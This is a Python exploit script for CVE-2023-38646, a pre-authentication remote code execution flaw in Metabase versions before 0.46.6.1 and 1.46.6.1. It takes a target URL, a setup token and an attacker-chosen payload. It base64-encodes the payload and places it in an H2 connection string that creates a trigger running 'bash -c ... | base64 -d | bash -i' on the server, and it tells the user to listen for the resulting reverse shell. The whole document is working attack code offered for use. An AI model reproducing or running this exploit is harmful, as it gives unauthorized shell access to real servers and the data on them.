from argparse import ArgumentParser
from string import ascii_uppercase

import base64
import random
import requests


def encode_payload_to_b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload


parser = ArgumentParser('Metabase Pre-Auth RCE Reverse Shell', 'This script causes a server running Metabase (< 0.46.6.1 for open-source edition and < 1.46.6.1 for enterprise edition) to execute a defined reverse shell through the security flaw described in CVE 2023-38646')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-t', '--token', type=str, required=True, help='Setup Token from /api/session/properties')
parser.add_argument('-p', '--payload', type=str, required=True, help='Payload')

args = parser.parse_args()

print('[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IN THE PAYLOAD [!]\n')

print('[+] Initialized script')

payload = encode_payload_to_b64(args.payload)

print('[+] Payload encoded')

url = f'{args.url}/api/setup/validate'

headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

data = {
    "token": args.token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), payload=payload),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

print('[+] Making request')

request = requests.post(url, json=data, headers=headers, proxies={'http': '127.0.0.1:8080'})

print('[+] Payload sent')